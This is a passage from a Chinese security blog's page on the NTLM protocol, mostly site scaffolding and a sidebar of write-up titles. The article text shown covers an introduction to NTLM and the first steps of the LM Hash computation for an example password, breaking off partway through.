<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>NTLM协议 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="简介NTLM(New Technology LAN Manager)协议是微软用于Windows身份验证的主要协议之一。继SMB、LM协议之后微软提出了NTLM协议，这一协议安全性更高，不仅可以用于工作组中的机器身份验证，又可以用于域环境身份验证，还可以为SMB、HTTP、LDAP、SMTP等上层应用提供身份验证。 LM Hash加密算法LM Hash本质是DES加密，但是LM Hash容易破解，">
<meta property="og:type" content="article">
<meta property="og:title" content="NTLM协议">
<meta property="og:url" content="http://ta0.fun/posts/b774aeb/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="简介NTLM(New Technology LAN Manager)协议是微软用于Windows身份验证的主要协议之一。继SMB、LM协议之后微软提出了NTLM协议，这一协议安全性更高，不仅可以用于工作组中的机器身份验证，又可以用于域环境身份验证，还可以为SMB、HTTP、LDAP、SMTP等上层应用提供身份验证。 LM Hash加密算法LM Hash本质是DES加密，但是LM Hash容易破解，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/09/OJaSSc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/09/OJad1M.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/09/OJa0wr.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/09/OJaC8s.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/09/OJoOJa.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/11/OJU6Za.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJqu2s.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJqwVS.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5hAv.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5iSq.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5nCc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ57nr.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5NDM.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/10/OJ5HpK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/11/OJBuya.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/11/OJU2BK.png">
<meta property="article:published_time" content="2024-05-09T05:30:17.430Z">
<meta property="article:modified_time" content="2025-07-29T03:58:30.130Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="windows协议">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/05/09/OJaSSc.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">140</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">29</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">210</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LM-Hash%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">LM Hash加密算法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTLM-Hash%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">NTLM Hash加密算法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8%E7%9A%84NTLM-Hash"><span class="toc-number">4.</span> <span class="toc-text">Windows系统存储的NTLM Hash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%B8%8BNTLM%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">工作组下NTLM协议认证机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%A3%80%E9%AA%8C"><span class="toc-number">5.1.</span> <span class="toc-text">实验检验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-NTLM-v2-Hash%E7%9A%84%E8%AE%A1%E7%AE%97"><span class="toc-number">5.2.</span> <span class="toc-text">Net-NTLM v2 Hash的计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#responder%E5%AE%9E%E9%AA%8C"><span class="toc-number">5.3.</span> <span class="toc-text">responder实验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84NTLM-%E8%AE%A4%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">域环境下的NTLM 认证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTLM-v1%E5%92%8CNTLM-v2%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">7.</span> <span class="toc-text">NTLM v1和NTLM v2的区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LmCompatibilityLevel"><span class="toc-number">8.</span> <span class="toc-text">LmCompatibilityLevel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">9.</span> <span class="toc-text">NTLM协议的安全问题</span></a></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnhub</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a5814cc3/">Vulnhub-64base</a></li><li class="sidebar-cat-post"><a href="/posts/b7e54991/">Vulnhub-Mercy</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MAZESEC-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/d12a1edd/">Linux远程连接RDP</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/b774aeb/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">NTLM协议</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-05-09 13:30:17" itemprop="dateCreated datePublished" datetime="2024-05-09T13:30:17+08:00">2024-05-09</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-07-29 11:58:30" itemprop="dateModified" datetime="2025-07-29T11:58:30+08:00">2025-07-29</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">5.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">22m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/AD/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">AD</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/windows%E5%8D%8F%E8%AE%AE/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">windows协议</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>NTLM(New Technology LAN Manager)<strong>协议是微软用于Windows身份验证的主要协议之一。继</strong>SMB</strong>、<strong>LM</strong>协议之后微软提出了NTLM协议，这一协议安全性更高，不仅可以用于工作组中的机器身份验证，又可以用于域环境身份验证，还可以为SMB、HTTP、LDAP、SMTP等上层应用提供身份验证。</p>
<h1 id="LM-Hash加密算法"><a href="#LM-Hash加密算法" class="headerlink" title="LM Hash加密算法"></a>LM Hash加密算法</h1><p>LM Hash本质是DES加密，但是LM Hash容易破解，从Windows Vista和Windows Server2008开始，Windows默认禁用LM Hash。<br>LM Hash加密明文限制在14位，如果密文大于14位，说明LM Hash位空值或者被禁用。<br>LM Hash加密流程</p>
<ol>
<li><p>将用户明文转化成大写，并转16进制<br>如 p@ssw0rd -&gt;P@SSW0RD-&gt;5040535357305244</p>
</li>
<li><p>如果转换后的十六进制字符串长度不足14B(28)，用0补全<br>5040535357305244-&gt;5040535357305244000000000000</p>
</li>
<li><p>将14B分为两组，每组7B，然后转二进制<br>50405353573052-&gt;01010000010000000101001101010011010101110011000001010010<br>44000000000000-&gt;01000100000000000000000000000000000000000000000000000000</p>
</li>
